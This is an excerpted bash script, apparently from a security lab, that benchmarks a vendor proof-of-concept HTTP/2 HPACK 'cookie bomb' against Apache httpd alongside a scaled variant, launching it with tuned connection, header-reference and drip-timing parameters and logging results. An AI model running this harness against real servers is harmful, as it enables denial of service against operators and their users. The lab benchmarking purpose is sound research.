#!/usr/bin/env bash
# A/B: vendor cookie PoC baseline vs apex_cookie_scaled (httpd lab)
set -uo pipefail

DIR="$(cd "$(dirname "$0")" && pwd)"
PLUGIN="$(cd "$DIR/.." && pwd)"
BENCH="$PLUGIN/benchmark"
POC="$PLUGIN/vendor/califio-publications/MADBugs/http2-bomb/httpd/hpack_httpd_cookie_bomb.py"
PY="${PY:-python3}"
...
CSV="$LOG_DIR/ab_httpd_${RUN_ID}.csv"
LOG="$LOG_DIR/ab_httpd_${RUN_ID}.log"
...
run_label() {
  ...
  if [[ "$mode" == "vendor" ]]; then
    $PY "$POC" --host "$HOST" --port "$PORT" -n "$CONN" --streams 8 --refs 4091 \
      --hold 120 --drip-interval 30 > "$LOG_DIR/${label}_${RUN_ID}.out" 2>&1 &
  else
    $PY "$BENCH/benchmark_runner.py" --host "$HOST" --port "$PORT" --variant httpd \
...
echo "=== httpd A/B $RUN_ID conn=$CONN ===" | tee "$LOG"
